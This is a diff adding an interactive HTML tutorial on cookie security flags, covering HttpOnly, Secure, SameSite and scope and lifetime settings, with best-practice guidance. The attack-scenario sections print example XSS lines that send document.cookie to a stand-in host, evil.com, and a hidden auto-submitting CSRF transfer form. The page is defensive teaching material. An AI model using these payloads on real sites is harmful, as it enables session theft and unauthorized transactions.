@@ -1,0 +1,571 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Cookie Security Flags · Interactive</title>
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#0f0f17;--surface:#1a1a2e;--surface2:#23234a;--text:#cdd6f4;--muted:#6c7086;
+  --blue:#89b4fa;--green:#a6e3a1;--red:#f38ba8;--yellow:#f9e2af;--peach:#fab387;
+  --teal:#94e2d5;--pink:#f5c2e7;--radius:8px;--orange:#f8bd7f;--header-bg:#1e1e36;
+}
+body{font-family:system-ui,'Segoe UI',sans-serif;background:var(--bg);color:var(--text);line-height:1.6;padding-bottom:60px}
+nav{background:var(--header-bg);padding:14px 24px;display:flex;align-items:center;gap:14px;border-bottom:1px solid var(--surface2);position:sticky;top:0;z-index:100}
+nav .logo{font-weight:700;font-size:1.1rem}
+nav .logo span{color:var(--teal)}
+nav .crumbs{font-size:.78rem;color:var(--muted)}
+nav .crumbs a{color:var(--blue);text-decoration:none}
+.container{max-width:1000px;margin:0 auto;padding:24px 20px}
+
+.section-title{font-size:1.4rem;font-weight:700;margin:36px 0 14px;color:var(--yellow);display:flex;align-items:center;gap:10px}
+.section-title .num{background:var(--surface2);color:var(--muted);font-size:.75rem;padding:2px 10px;border-radius:20px}
+
+.card{background:var(--surface);border:1px solid var(--surface2);border-radius:var(--radius);padding:20px;margin-bottom:18px}
+.card h3{color:var(--blue);margin-bottom:8px;font-size:1rem}
+.card p{color:var(--muted);font-size:.88rem;margin-bottom:8px}
+
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+.grid3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:14px}
+.grid4{display:grid;grid-template-columns:1fr 1fr 1fr 1fr;gap:12px}
+@media(max-width:680px){.grid2,.grid3,.grid4{grid-template-columns:1fr}}
+
+.code{background:#0a0a14;border-radius:6px;padding:12px 14px;font-family:monospace;font-size:.78rem;overflow-x:auto;border:1px solid var(--surface2);line-height:1.7;margin:8px 0}
+.code .comment{color:var(--muted)}
+.code .keyword{color:var(--blue)}
+.code .string{color:var(--green)}
+.code .flag{font-weight:700}
+.code .flag.httponly{color:var(--green)}
+.code .flag.samesite{color:var(--yellow)}
+.code .flag.secure{color:var(--blue)}
+.code .flag.domain{color:var(--pink)}
+.code .flag.path{color:var(--peach)}
+.code .flag.expires{color:var(--orange)}
+
+.badge{display:inline-block;padding:2px 10px;border-radius:12px;font-size:.72rem;font-weight:600}
+.badge.red{background:rgba(243,139,168,.18);color:var(--red)}
+.badge.blue{background:rgba(137,180,250,.18);color:var(--blue)}
+.badge.green{background:rgba(166,227,161,.18);color:var(--green)}
+.badge.yellow{background:rgba(249,226,175,.18);color:var(--yellow)}
+.badge.pink{background:rgba(245,194,231,.18);color:var(--pink)}
+
+.callout{padding:12px 16px;border-radius:var(--radius);margin:12px 0;font-size:.84rem;border-left:4px solid var(--blue);background:rgba(137,180,250,.04)}
+.callout.danger{border-color:var(--red);background:rgba(243,139,168,.06)}
+.callout.warn{border-color:var(--yellow);background:rgba(249,226,175,.06)}
+.callout.success{border-color:var(--green);background:rgba(166,227,161,.06)}
+
+/* Interactive cookie builder */
+.cookie-builder{background:var(--bg);border-radius:var(--radius);border:1px solid var(--surface2);padding:20px;margin:14px 0}
+.cookie-builder .preview-zone{font-family:monospace;font-size:.85rem;padding:14px;background:#0a0a14;border-radius:6px;border:1px solid var(--surface2);word-break:break-all;line-height:1.8;margin-bottom:16px}
+
+.flag-toggle{display:flex;align-items:center;gap:12px;padding:12px 14px;margin:6px 0;border-radius:6px;border:1px solid var(--surface2);background:var(--bg);cursor:pointer;transition:.15s}
+.flag-toggle:hover{border-color:var(--blue)}
+.flag-toggle .switch{position:relative;width:40px;height:22px;flex-shrink:0}
+.flag-toggle .switch input{opacity:0;width:0;height:0}
+.flag-toggle .switch .slider{position:absolute;cursor:pointer;top:0;left:0;right:0;bottom:0;background:var(--surface2);border-radius:11px;transition:.2s}
+.flag-toggle .switch .slider::before{content:"";position:absolute;height:16px;width:16px;left:3px;bottom:3px;background:var(--muted);border-radius:50%;transition:.2s}
+.flag-toggle .switch input:checked+.slider{background:var(--green)}
+.flag-toggle .switch input:checked+.slider::before{background:white;transform:translateX(18px)}
+.flag-toggle .info{flex:1}
+.flag-toggle .info h4{font-size:.88rem;margin-bottom:2px}
+.flag-toggle .info p{font-size:.74rem;color:var(--muted);margin:0}
+.flag-toggle .effect{font-size:.74rem;font-weight:600;min-width:100px;text-align:right}
+
+/* Attack simulator */
+.attack-sim{display:flex;gap:10px;align-items:center;padding:12px;background:var(--bg);border-radius:6px;border:1px solid var(--surface2);margin:8px 0}
+.attack-sim .actor{width:80px;height:60px;display:flex;flex-direction:column;align-items:center;justify-content:center;border-radius:6px;font-size:.68rem;text-align:center;font-weight:600}
+.attack-sim .actor.browser{background:rgba(137,180,250,.12);border:1px solid rgba(137,180,250,.3);color:var(--blue)}
+.attack-sim .actor.attacker{background:rgba(243,139,168,.12);border:1px solid rgba(243,139,168,.3);color:var(--red)}
+.attack-sim .actor.server{background:rgba(166,227,161,.12);border:1px solid rgba(166,227,161,.3);color:var(--green)}
+.attack-sim .arrow{color:var(--muted);font-size:1rem}
+.attack-sim .result{font-size:.78rem;padding:8px;border-radius:4px;flex:1}
+.attack-sim .result.success{color:var(--green)}
+.attack-sim .result.fail{color:var(--red)}
+
+.result-badge{padding:4px 12px;border-radius:6px;font-size:.78rem;font-weight:600;display:inline-block}
+.result-badge.protected{background:rgba(166,227,161,.12);color:var(--green)}
+.result-badge.vulnerable{background:rgba(243,139,168,.12);color:var(--red)}
+
+/* Cookie visual */
+.cookie-visual{display:flex;align-items:center;gap:10px;padding:16px;border-radius:var(--radius);margin:10px 0;flex-wrap:wrap}
+.cookie-visual.jar{background:rgba(249,226,175,.05);border:1px dashed rgba(249,226,175,.2);min-height:60px}
+.cookie-piece{display:inline-flex;align-items:center;gap:4px;padding:6px 12px;border-radius:16px;font-size:.78rem;font-weight:600}
+.cookie-piece.name{background:rgba(137,180,250,.15);color:var(--blue);border:1px solid rgba(137,180,250,.3)}
+.cookie-piece.value{background:rgba(166,227,161,.15);color:var(--green);border:1px solid rgba(166,227,161,.3)}
+.cookie-piece.flag{background:rgba(249,226,175,.1);color:var(--yellow);border:1px solid rgba(249,226,175,.2)}
+.cookie-piece.flag.on{background:rgba(166,227,161,.15);color:var(--green);border-color:var(--green)}
+
+table{width:100%;border-collapse:collapse;font-size:.84rem}
+th,td{padding:10px 12px;text-align:left;border-bottom:1px solid var(--surface2)}
+th{color:var(--muted);font-weight:600;font-size:.75rem;text-transform:uppercase}
+tr:hover td{background:rgba(255,255,255,.02)}
+
+@media(max-width:600px){.attack-sim{flex-wrap:wrap}}
+</style>
+</head>
+<body>
+
+<nav>
+  <div class="logo"><span>&#127850;</span> Cookie Security Flags</div>
+  <div class="crumbs"><a href="index.html">SECURITY</a> &rsaquo; Cookie Flags</div>
+  <div style="margin-left:auto;font-size:.7rem;padding:2px 8px;border-radius:12px;background:rgba(166,227,161,.18);color:var(--green)">Defense</div>
+</nav>
+
+<div class="container">
+
+<!-- INTRO -->
+<div class="section-title"><span class="num">1</span> What Are Cookie Flags?</div>
+<div class="card">
+  <p>Cookie flags are <strong>directives</strong> you set on <code>Set-Cookie</code> headers that tell the browser how to handle the cookie. They are your <strong>first line of defense</strong> against session theft, XSS, and CSRF.</p>
+  <div class="code" style="font-size:.82rem;text-align:center;padding:16px">
+Set-Cookie: <span style="color:var(--blue)">session</span>=<span style="color:var(--green)">abc123</span>; <span class="flag httponly">HttpOnly</span>; <span class="flag secure">Secure</span>; <span class="flag samesite">SameSite=Strict</span>
+  </div>
+  <p style="text-align:center;font-size:.82rem;color:var(--muted)">A well-protected cookie. Click the flags below to understand each one.</p>
+</div>
+
+<!-- ============================================ -->
+<!-- INTERACTIVE COOKIE BUILDER -->
+<!-- ============================================ -->
+<div class="section-title"><span class="num">2</span> Interactive Cookie Builder</div>
+<div class="card">
+  <p>Toggle each flag on/off and see how the cookie header changes — and what attacks it prevents.</p>
+
+  <div class="cookie-builder">
+    <div class="preview-zone" id="cookiePreview">
+      <span style="color:var(--blue)">session</span>=<span style="color:var(--green)">abc123</span>;
+    </div>
+
+    <div class="flag-toggle" id="flagHttpOnly" onclick="toggleFlag('HttpOnly')">
+      <div class="switch"><input type="checkbox" checked id="chkHttpOnly"><span class="slider"></span></div>
+      <div class="info">
+        <h4>HttpOnly</h4>
+        <p>JavaScript cannot access this cookie via <code>document.cookie</code></p>
+      </div>
+      <div class="effect" id="effectHttpOnly" style="color:var(--green)">Blocks XSS theft</div>
+    </div>
+
+    <div class="flag-toggle" id="flagSecure" onclick="toggleFlag('Secure')">
+      <div class="switch"><input type="checkbox" checked id="chkSecure"><span class="slider"></span></div>
+      <div class="info">
+        <h4>Secure</h4>
+        <p>Cookie only sent over HTTPS — never over HTTP</p>
+      </div>
+      <div class="effect" id="effectSecure" style="color:var(--green)">Blocks MITM theft</div>
+    </div>
+
+    <div class="flag-toggle" id="flagSameSite" onclick="toggleFlag('SameSite')">
+      <div class="switch"><input type="checkbox" checked id="chkSameSite"><span class="slider"></span></div>
+      <div class="info">
+        <h4>SameSite=Strict</h4>
+        <p>Cookie not sent with cross-site requests (prevents CSRF)</p>
+      </div>
+      <div class="effect" id="effectSameSite" style="color:var(--green)">Blocks CSRF</div>
+    </div>
+
+    <div class="flag-toggle" id="flagDomain" onclick="toggleFlag('Domain')">
+      <div class="switch"><input type="checkbox" id="chkDomain"><span class="slider"></span></div>
+      <div class="info">
+        <h4>Domain</h4>
+        <p>Restricts cookie to specific domain (e.g., <code>api.bank.com</code>)</p>
+      </div>
+      <div class="effect" id="effectDomain" style="color:var(--muted)">Scope restriction</div>
+    </div>
+
+    <div class="flag-toggle" id="flagPath" onclick="toggleFlag('Path')">
+      <div class="switch"><input type="checkbox" id="chkPath"><span class="slider"></span></div>
+      <div class="info">
+        <h4>Path</h4>
+        <p>Restricts cookie to specific URL path</p>
+      </div>
+      <div class="effect" id="effectPath" style="color:var(--muted)">Scope restriction</div>
+    </div>
+
+    <div class="flag-toggle" id="flagExpires" onclick="toggleFlag('Expires')">
+      <div class="switch"><input type="checkbox" id="chkExpires"><span class="slider"></span></div>
+      <div class="info">
+        <h4>Max-Age / Expires</h4>
+        <p>Sets cookie lifetime — persistent vs session cookie</p>
+      </div>
+      <div class="effect" id="effectExpires" style="color:var(--muted)">Lifetime control</div>
+    </div>
+  </div>
+</div>
+
+<!-- ============================================ -->
+<!-- HttPOnly DEEP DIVE -->
+<!-- ============================================ -->
+<div class="section-title"><span class="num">3</span> HttpOnly · Deep Dive</div>
+<div class="grid2">
+  <div class="card" style="border-top:3px solid var(--green)">
+    <h3>&#9654; What it does</h3>
+    <p>When set, <code>document.cookie</code> in JavaScript <strong>returns empty</strong> for that cookie. The browser still sends it with HTTP requests — JS just can't read it.</p>
+    <div class="code" style="font-size:.76rem">
+<span class="comment">// Cookie: session=abc; HttpOnly</span>
+console.log(document.cookie);
+<span class="comment">// Output: "" (empty!)</span>
+<span class="comment">// HttpOnly cookie is invisible to JS</span>
+    </div>
+    <div class="callout success" style="font-size:.78rem;padding:8px 12px">
+      <strong>&#10003; Prevents XSS-based cookie theft.</strong> Even if an attacker injects <code>&lt;script&gt;document.location='evil.com?c='+document.cookie&lt;/script&gt;</code>, the cookie is not in the output.
+    </div>
+  </div>
+  <div class="card" style="border-top:3px solid var(--red)">
+    <h3>&#9888; What it does NOT do</h3>
+    <div style="line-height:2;font-size:.84rem">
+      <div>&#10060; Does <strong>not</strong> prevent CSRF (cookie still sent)</div>
+      <div>&#10060; Does <strong>not</strong> encrypt the cookie</div>
+      <div>&#10060; Does <strong>not</strong> prevent MITM (use Secure + HTTPS)</div>
+      <div>&#10060; Does <strong>not</strong> prevent XSS itself (just limits damage)</div>
+    </div>
+    <div class="demo-box" style="margin-top:8px;padding:10px;background:var(--bg);border-radius:6px;border:1px solid var(--surface2);font-size:.82rem">
+      <strong>Try it:</strong> Right-click &#8594; Inspect &#8594; Console, type <code>document.cookie</code>. If the site uses HttpOnly, you see nothing!
+    </div>
+  </div>
+</div>
+
+<div class="card">
+  <h3>&#9654; Live Demo: HttpOnly stops cookie theft</h3>
+  <div class="grid2">
+    <div>
+      <p style="font-size:.82rem;color:var(--muted)">With <strong>HttpOnly</strong> (ON):</p>
+      <div class="attack-sim">
+        <div class="actor browser">&#128187; Browser</div>
+        <div class="arrow">&#8594;</div>
+        <div class="actor attacker">&#128520; XSS script</div>
+        <div class="arrow">&#8594;</div>
+        <div class="result success">document.cookie = ""<br>Cookie safe!</div>
+      </div>
+    </div>
+    <div>
+      <p style="font-size:.82rem;color:var(--muted)">Without <strong>HttpOnly</strong> (OFF):</p>
+      <div class="attack-sim">
+        <div class="actor browser">&#128187; Browser</div>
+        <div class="arrow">&#8594;</div>
+        <div class="actor attacker">&#128520; XSS script</div>
+        <div class="arrow">&#8594;</div>
+        <div class="result fail">document.cookie = "session=abc"<br>Cookie stolen!</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ============================================ -->
+<!-- Secure DEEP DIVE -->
+<!-- ============================================ -->
+<div class="section-title"><span class="num">4</span> Secure · Deep Dive</div>
+<div class="grid2">
+  <div class="card" style="border-top:3px solid var(--blue)">
+    <h3>&#9654; What it does</h3>
+    <p>The browser will <strong>only send</strong> a Secure cookie over HTTPS. On HTTP, the cookie is not included in requests. This prevents <strong>network sniffing</strong> (MITM).</p>
+    <div class="code" style="font-size:.76rem">
+<span class="comment">// Cookie: session=abc; Secure</span>
+
+<span style="color:var(--green)">// HTTPS request:</span>
+Cookie: session=abc <span class="comment">&#10003; Sent</span>
+
+<span style="color:var(--red)">// HTTP request:</span>
+<span class="comment">// Cookie NOT sent (browser refuses)</span>
+    </div>
+    <div class="callout warn" style="font-size:.78rem;padding:8px 12px">
+      <strong>&#9888; Important:</strong> Secure does NOT encrypt the cookie value. The cookie value is still readable in the browser. It just requires HTTPS for transmission.
+    </div>
+  </div>
+  <div class="card" style="border-top:3px solid var(--red)">
+    <h3>&#9888; What happens without Secure</h3>
+    <div class="attack-sim" style="flex-wrap:wrap">
+      <div class="actor browser">&#128187; Browser</div>
+      <div class="arrow">&#8594;</div>
+      <div class="actor attacker" style="background:rgba(243,139,168,.12);border-color:var(--red);color:var(--red)">&#128373; MITM / Sniffer</div>
+      <div class="arrow">&#8594;</div>
+      <div class="result fail">Cookie sent in plaintext over HTTP<br><span style="color:var(--red)">Cookie stolen!</span></div>
+    </div>
+    <div style="margin-top:10px;font-size:.82rem">
+      <strong>Real scenario:</strong> User on public WiFi (coffee shop). Attacker on same network sniffs HTTP traffic. Without Secure flag, session cookie is visible in plain text.
+    </div>
+  </div>
+</div>
+
+<!-- ============================================ -->
+<!-- SameSite DEEP DIVE -->
+<!-- ============================================ -->
+<div class="section-title"><span class="num">5</span> SameSite · Deep Dive</div>
+<div class="card">
+  <h3>&#9654; The Three Values</h3>
+  <div class="grid3">
+    <div style="padding:14px;border-radius:var(--radius);border:2px solid var(--green);text-align:center">
+      <h4 style="color:var(--green)">SameSite=Strict</h4>
+      <div style="font-size:1.5rem;margin:6px 0">&#128737;</div>
+      <p style="font-size:.78rem">Cookie never sent cross-site. Most secure but breaks some UX (social login links).</p>
+    </div>
+    <div style="padding:14px;border-radius:var(--radius);border:2px solid var(--yellow);text-align:center">
+      <h4 style="color:var(--yellow)">SameSite=Lax</h4>
+      <div style="font-size:1.5rem;margin:6px 0">&#128274;</div>
+      <p style="font-size:.78rem">Sent for top-level GET navigations (links). Not sent for POST/CORS/fetch. Good default.</p>
+    </div>
+    <div style="padding:14px;border-radius:var(--radius);border:2px solid var(--red);text-align:center">
+      <h4 style="color:var(--red)">SameSite=None</h4>
+      <div style="font-size:1.5rem;margin:6px 0">&#127760;</div>
+      <p style="font-size:.78rem">Cookie sent with all cross-site requests. Requires Secure. Vulnerable to CSRF if unchecked.</p>
+    </div>
+  </div>
+</div>
+
+<div class="card">
+  <h3>&#9654; Visual: How SameSite blocks CSRF</h3>
+  <div class="grid3" style="text-align:center">
+    <div>
+      <div style="padding:10px;background:rgba(166,227,161,.08);border-radius:6px;border:1px solid var(--green);margin-bottom:6px">
+        <strong style="color:var(--green)">With SameSite=Strict</strong>
+      </div>
+      <div class="attack-sim" style="flex-direction:column;gap:4px;align-items:stretch">
+        <div class="actor attacker" style="width:auto">&#128279; evil.com</div>
+        <div class="arrow" style="text-align:center">&#8595; POST /transfer</div>
+        <div class="result success" style="text-align:center">&#10007; Cookie NOT sent<br>Request rejected!</div>
+      </div>
+    </div>
+    <div>
+      <div style="padding:10px;background:rgba(249,226,175,.08);border-radius:6px;border:1px solid var(--yellow);margin-bottom:6px">
+        <strong style="color:var(--yellow)">With SameSite=Lax</strong>
+      </div>
+      <div class="attack-sim" style="flex-direction:column;gap:4px;align-items:stretch">
+        <div class="actor attacker" style="width:auto">&#128279; evil.com</div>
+        <div class="arrow" style="text-align:center">&#8595; POST /transfer</div>
+        <div class="result success" style="text-align:center">&#10007; Cookie NOT sent<br>(Lax blocks POST)</div>
+      </div>
+    </div>
+    <div>
+      <div style="padding:10px;background:rgba(243,139,168,.08);border-radius:6px;border:1px solid var(--red);margin-bottom:6px">
+        <strong style="color:var(--red)">SameSite=None (vulnerable)</strong>
+      </div>
+      <div class="attack-sim" style="flex-direction:column;gap:4px;align-items:stretch">
+        <div class="actor attacker" style="width:auto">&#128279; evil.com</div>
+        <div class="arrow" style="text-align:center">&#8595; POST /transfer</div>
+        <div class="result fail" style="text-align:center">&#10003; Cookie SENT!<br>CSRF successful!</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ============================================ -->
+<!-- COMPARISON TABLE -->
+<!-- ============================================ -->
+<div class="section-title"><span class="num">6</span> Flag Comparison</div>
+<div class="card">
+  <table>
+    <tr><th>Flag</th><th>What it prevents</th><th>What it does NOT prevent</th><th>Recommendation</th></tr>
+    <tr>
+      <td><strong style="color:var(--green)">HttpOnly</strong></td>
+      <td>XSS-based cookie theft (via JS)</td>
+      <td>CSRF, MITM, XSS execution</td>
+      <td><span class="badge green">Always ON</span></td>
+    </tr>
+    <tr>
+      <td><strong style="color:var(--blue)">Secure</strong></td>
+      <td>MITM sniffing on HTTP</td>
+      <td>XSS, CSRF, server-side attacks</td>
+      <td><span class="badge green">Always ON</span></td>
+    </tr>
+    <tr>
+      <td><strong style="color:var(--yellow)">SameSite=Strict</strong></td>
+      <td>CSRF (all cross-site requests)</td>
+      <td>XSS, MITM</td>
+      <td><span class="badge yellow">Preferred (UX tradeoff)</span></td>
+    </tr>
+    <tr>
+      <td><strong style="color:var(--yellow)">SameSite=Lax</strong></td>
+      <td>CSRF on state-changing requests</td>
+      <td>Cross-site GET (links still work)</td>
+      <td><span class="badge green">Good default</span></td>
+    </tr>
+    <tr>
+      <td><strong style="color:var(--pink)">Domain</strong></td>
+      <td>Cookie scope creep (subdomain isolation)</td>
+      <td>XSS, CSRF on same domain</td>
+      <td><span class="badge yellow">Set explicitly</span></td>
+    </tr>
+    <tr>
+      <td><strong style="color:var(--peach)">Path</strong></td>
+      <td>Cookie sent to wrong paths (limited)</td>
+      <td>Most attacks (easily bypassed)</td>
+      <td><span class="badge">Optional</span></td>
+    </tr>
+    <tr>
+      <td><strong style="color:var(--orange)">Max-Age / Expires</strong></td>
+      <td>Stale cookie reuse (limited window)</td>
+      <td>Active session attacks</td>
+      <td><span class="badge green">Set reasonable TTL</span></td>
+    </tr>
+  </table>
+</div>
+
+<!-- ============================================ -->
+<!-- ATTACK SCENARIOS -->
+<!-- ============================================ -->
+<div class="section-title"><span class="num">7</span> Attack Scenarios</div>
+
+<div class="card">
+  <h3>&#128520; Scenario: Attacker steals cookie via XSS</h3>
+  <div class="code" style="font-size:.76rem">
+<span class="comment">// Injected by attacker on a forum:</span>
+<span class="danger">&lt;script&gt;</span>
+  fetch(<span class="string">'https://evil.com/steal?c='</span> + document.cookie);
+<span class="danger">&lt;/script&gt;</span>
+  </div>
+  <div class="grid2" style="margin-top:8px">
+    <div style="padding:12px;border-radius:6px;background:rgba(243,139,168,.06);border:1px solid rgba(243,139,168,.2)">
+      <strong style="color:var(--red)">Vanilla cookie (no HttpOnly):</strong>
+      <div style="font-family:monospace;font-size:.8rem;margin-top:4px">document.cookie = "session=abc123; token=eyJ..."</div>
+      <div style="color:var(--red);font-weight:600;margin-top:4px">&#10007; Stolen! Sent to evil.com</div>
+    </div>
+    <div style="padding:12px;border-radius:6px;background:rgba(166,227,161,.06);border:1px solid rgba(166,227,161,.2)">
+      <strong style="color:var(--green)">With HttpOnly:</strong>
+      <div style="font-family:monospace;font-size:.8rem;margin-top:4px">document.cookie = ""</div>
+      <div style="color:var(--green);font-weight:600;margin-top:4px">&#10003; Empty! Attacker gets nothing</div>
+    </div>
+  </div>
+</div>
+
+<div class="card">
+  <h3>&#128520; Scenario: Attacker performs CSRF via hidden form</h3>
+  <div class="code" style="font-size:.76m">
+<span class="comment">// Hidden on evil.com — auto-submits on page load:</span>
+<span class="danger">&lt;form action="https://bank.com/transfer" method="POST"&gt;</span>
+  &lt;input name="to" value="attacker" /&gt;
+  &lt;input name="amount" value="1000" /&gt;
+<span class="danger">&lt;/form&gt;</span>
+<span class="danger">&lt;script&gt;</span>document.forms[0].submit();<span class="danger">&lt;/script&gt;</span>
+  </div>
+  <div class="grid2" style="margin-top:8px">
+    <div style="padding:12px;border-radius:6px;background:rgba(243,139,168,.06);border:1px solid rgba(243,139,168,.2)">
+      <strong style="color:var(--red)">Without SameSite:</strong>
+      <div style="font-size:.82rem;margin-top:4px">Cookie auto-sent with cross-site POST request.</div>
+      <div style="color:var(--red);font-weight:600;margin-top:4px">&#10007; Transfer executed!</div>
+    </div>
+    <div style="padding:12px;border-radius:6px;background:rgba(166,227,161,.06);border:1px solid rgba(166,227,161,.2)">
+      <strong style="color:var(--green)">With SameSite=Strict/Lax:</strong>
+      <div style="font-size:.82rem;margin-top:4px">Cookie NOT sent with cross-site POST request.</div>
+      <div style="color:var(--green);font-weight:600;margin-top:4px">&#10003; Server sees no auth — rejects!</div>
+    </div>
+  </div>
+</div>
+
+<!-- ============================================ -->
+<!-- BEST PRACTICES -->
+<!-- ============================================ -->
+<div class="section-title"><span class="num">8</span> Best Practices</div>
+<div class="grid2">
+  <div class="card" style="border-top:3px solid var(--green)">
+    <h3 style="color:var(--green)">&#10003; Recommended</h3>
+    <div class="code" style="font-size:.78rem;margin:6px 0">
+Set-Cookie: session=abc;
+  <span class="flag httponly">HttpOnly</span>;
+  <span class="flag secure">Secure</span>;
+  <span class="flag samesite">SameSite=Lax</span>;
+  Max-Age=<span class="number">86400</span>
+    </div>
+    <ul style="padding-left:18px;font-size:.84rem;line-height:2">
+      <li>Always set <strong>HttpOnly</strong> (unless JS needs cookie access)</li>
+      <li>Always set <strong>Secure</strong> (HTTPS only)</li>
+      <li>Set <strong>SameSite=Lax</strong> as default</li>
+      <li>Use <strong>SameSite=Strict</strong> for sensitive actions</li>
+      <li>Set reasonable <strong>Max-Age</strong> (session vs persistent)</li>
+      <li>Use <strong>__Secure-</strong> and <strong>__Host-</strong> cookie name prefixes</li>
+    </ul>
+  </div>
+  <div class="card" style="border-top:3px solid var(--red)">
+    <h3 style="color:var(--red)">&#10007; Avoid</h3>
+    <div class="code" style="font-size:.78rem;margin:6px 0">
+Set-Cookie: session=abc;
+  <span style="color:var(--red)">SameSite=None</span>
+  <span class="comment">// Missing Secure! Browser rejects</span>
+    </div>
+    <ul style="padding-left:18px;font-size:.84rem;line-height:2">
+      <li>Setting <strong>SameSite=None</strong> without understanding CSRF risk</li>
+      <li>Omitting <strong>Secure</strong> with SameSite=None (browser rejects)</li>
+      <li>Omitting <strong>HttpOnly</strong> for session cookies</li>
+      <li>Using <strong>Domain=</strong> too broadly (e.g., .com)</li>
+      <li>Setting <strong>Max-Age</strong> years into the future</li>
+      <li>Storing secrets (tokens) without HttpOnly protection</li>
+    </ul>
+  </div>
+</div>
+
+<!-- REFERENCE -->
+<div class="section-title"><span class="num">R</span> Quick Reference</div>
+<div class="card">
+  <table>
+    <tr><th>Flag</th><th>Syntax</th><th>Effect</th></tr>
+    <tr><td><strong style="color:var(--green)">HttpOnly</strong></td><td><code>HttpOnly</code></td><td>JS cannot read cookie via document.cookie</td></tr>
+    <tr><td><strong style="color:var(--blue)">Secure</strong></td><td><code>Secure</code></td><td>Cookie only sent over HTTPS</td></tr>
+    <tr><td><strong style="color:var(--yellow)">SameSite</strong></td><td><code>SameSite=Strict|Lax|None</code></td><td>Controls cross-site cookie sending</td></tr>
+    <tr><td><strong style="color:var(--pink)">Domain</strong></td><td><code>Domain=example.com</code></td><td>Restricts cookie to domain + subdomains</td></tr>
+    <tr><td><strong style="color:var(--peach)">Path</strong></td><td><code>Path=/api</code></td><td>Restricts cookie to URL path prefix</td></tr>
+    <tr><td><strong style="color:var(--orange)">Max-Age</strong></td><td><code>Max-Age=86400</code></td><td>Cookie lifetime in seconds</td></tr>
+    <tr><td><strong style="color:var(--orange)">Expires</strong></td><td><code>Expires=Wed, 21 Oct 2025 07:28:00 GMT</code></td><td>Cookie expiration date (absolute)</td></tr>
+  </table>
+</div>
+
+<div class="callout success" style="text-align:center;padding:16px">
+  <strong>&#10003; Remember:</strong> HttpOnly + Secure + SameSite = the holy trinity of cookie security.
+</div>
+
+</div><!-- /container -->
+
+<script>
+// =====================================================
+// INTERACTIVE COOKIE BUILDER
+// =====================================================
+const flags = {
+  HttpOnly: {on: true, label: 'HttpOnly', cls: 'httponly'},
+  Secure: {on: true, label: 'Secure', cls: 'secure'},
+  SameSite: {on: true, label: 'SameSite=Strict', cls: 'samesite'},
+  Domain: {on: false, label: 'Domain=.bank.com', cls: 'domain'},
+  Path: {on: false, label: 'Path=/api', cls: 'path'},
+  Expires: {on: false, label: 'Max-Age=86400', cls: 'expires'},
+};
+
+function toggleFlag(name) {
+  const chk = document.getElementById('chk' + name);
+  chk.checked = !chk.checked;
+  flags[name].on = chk.checked;
+  updateCookiePreview();
+}
+
+function updateCookiePreview() {
+  const preview = document.getElementById('cookiePreview');
+  const parts = ['<span style="color:var(--blue)">session</span>=<span style="color:var(--green)">abc123</span>'];
+  const effects = {
+    HttpOnly: 'Blocks XSS theft',
+    Secure: 'Blocks MITM theft',
+    SameSite: 'Blocks CSRF',
+    Domain: 'Scope restriction',
+    Path: 'Scope restriction',
+    Expires: 'Lifetime control',
+  };
+
+  for (const [key, f] of Object.entries(flags)) {
+    const el = document.getElementById('flag' + key);
+    const eff = document.getElementById('effect' + key);
+    if (f.on) {
+      parts.push(`<span class="flag ${f.cls}">${f.label}</span>`);
+      el.style.borderLeft = '3px solid var(--green)';
+      eff.textContent = effects[key];
+      eff.style.color = 'var(--green)';
+    } else {
+      el.style.borderLeft = '3px solid var(--surface2)';
+      eff.textContent = 'OFF';
+      eff.style.color = 'var(--red)';
+    }
+  }
+
+  preview.innerHTML = parts.join('; ');
+}
+
+// =====================================================
+// INIT
+// =====================================================
+updateCookiePreview();
+</script>
+</body>
+</html>
